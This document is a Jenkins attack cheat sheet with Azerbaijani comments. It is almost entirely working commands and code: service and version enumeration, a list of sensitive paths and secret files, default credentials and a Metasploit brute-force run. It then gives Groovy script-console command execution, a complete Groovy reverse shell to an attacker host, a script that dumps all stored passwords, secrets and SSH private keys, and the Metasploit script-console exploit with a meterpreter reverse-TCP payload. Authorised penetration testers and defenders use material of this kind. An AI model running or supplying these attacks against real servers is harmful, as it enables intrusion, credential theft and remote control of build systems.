# Enumeration
```powershell
# Nmap scan
nmap -sV -p 8080,8443,50000 target.com

# Script ilə
nmap -sV --script=http-title,http-auth-info -p 8080 target.com
```

# Version 
```powershell
# HTTP header
curl -s -I https://target.com:8080 | grep -i "x-jenkins\|server"
# X-Jenkins: 2.387.3
# X-Hudson: 1.395

# Ana səhifədən
curl -s https://target.com:8080 | grep -i "jenkins\|version"

# /login səhifəsi
curl -s https://target.com:8080/login | grep -i "ver\|jenkins"

# robots.txt
curl -s https://target.com:8080/robots.txt

# /oops səhifəsi
curl -s https://target.com:8080/oops | grep -i jenkins

# API ilə
curl -s https://target.com:8080/api/json | python3 -m json.tool
```

# Main Paths
```powershell
# Əsas panellər
https://target.com:8080/                        # Ana səhifə
https://target.com:8080/login                   # Login
https://target.com:8080/logout                  # Logout
https://target.com:8080/script                  # Groovy Script Console ← KRİTİK
https://target.com:8080/manage                  # İdarəetmə paneli
https://target.com:8080/systemInfo              # Sistem məlumatı
https://target.com:8080/credentials/            # Credentials
https://target.com:8080/asynchPeople/           # İstifadəçi siyahısı
https://target.com:8080/securityRealm/          # Security konfiqurasiyası

# API endpointlər
https://target.com:8080/api/json                # JSON API
https://target.com:8080/api/xml                 # XML API
https://target.com:8080/computer/api/json       # Agent məlumatları
https://target.com:8080/view/all/api/json       # View siyahısı

# Həssas fayllar (server tərəfindən)
~/.jenkins/config.xml
~/.jenkins/credentials.xml
~/.jenkins/secrets/master.key
~/.jenkins/secrets/hudson.util.Secret
~/.jenkins/users/
~/.jenkins/jobs/
```

# Default Credentials
```powershell
# Ən çox rast gəlinən
admin:admin
admin:password
admin:jenkins
jenkins:jenkins
admin:
root:root
guest:guest

# Quraşdırma zamanı yaradılan şifrə (server-də axtarılır)
cat /var/jenkins_home/secrets/initialAdminPassword
cat /var/lib/jenkins/secrets/initialAdminPassword
sudo cat /var/jenkins_home/secrets/initialAdminPassword

# Docker konteynerindən
docker exec <container_id> cat /var/jenkins_home/secrets/initialAdminPassword
```

# Brute Force
```powershell
use auxiliary/scanner/http/jenkins_login
set RHOSTS target.com
set RPORT 8080
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

# Exploitation
```powershell
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

# Scripts
```powershell
// Komanda icra et (Linux)
println "id".execute().text
println "whoami".execute().text
println "hostname".execute().text
println "cat /etc/passwd".execute().text

// Komanda icra et (Windows)
println "cmd /c whoami".execute().text
println "cmd /c dir C:\\".execute().text
println "cmd /c ipconfig".execute().text

// Daha etibarlı icra metodu
def cmd = ["bash", "-c", "id && hostname && whoami"]
def proc = cmd.execute()
proc.waitFor()
println proc.text

// Environment dəyişənlər
println System.getenv()

// Java properties
println System.getProperties()

// Linux reverse shell
String host = "attacker_ip"
int port = 4444
String cmd = "bash"
Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start()
Socket s = new Socket(host, port)
InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream()
OutputStream po = p.getOutputStream(), so = s.getOutputStream()
while (!s.isClosed()) {
  while (pi.available() > 0) so.write(pi.read())
  while (pe.available() > 0) so.write(pe.read())
  while (si.available() > 0) po.write(si.read())
  so.flush(); po.flush(); Thread.sleep(50)
  try { p.exitValue(); break } catch (Exception e) {}
}
p.destroy(); s.close()
```

# Credentials
```powershell
// Bütün credentials-ı göstər
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.common.*
import com.cloudbees.plugins.credentials.domains.*
import com.cloudbees.jenkins.plugins.sshcredentials.impl.*
import org.jenkinsci.plugins.plaincredentials.impl.*
import hudson.util.Secret

def creds = SystemCredentialsProvider.getInstance().getCredentials()
creds.each { c ->
  if (c instanceof UsernamePasswordCredentialsImpl) {
    println "Username: ${c.username}"
    println "Password: ${Secret.toString(c.password)}"
  } else if (c instanceof StringCredentialsImpl) {
    println "Secret: ${Secret.toString(c.secret)}"
  } else if (c instanceof BasicSSHUserPrivateKey) {
    println "SSH Key: ${c.privateKey}"
  }
  println "---"
}
```

# Msfconsole
```powershell
msfconsole

use auxiliary/scanner/http/jenkins_enum
set RHOSTS target.com
run

use exploit/multi/http/jenkins_script_console
set RHOSTS target.com
set RPORT 8080
set USERNAME admin
set PASSWORD admin
set LHOST attacker_ip
set LPORT 4444
set LURI /          # Jenkins root path
set PAYLOAD java/meterpreter/reverse_tcp
run
```
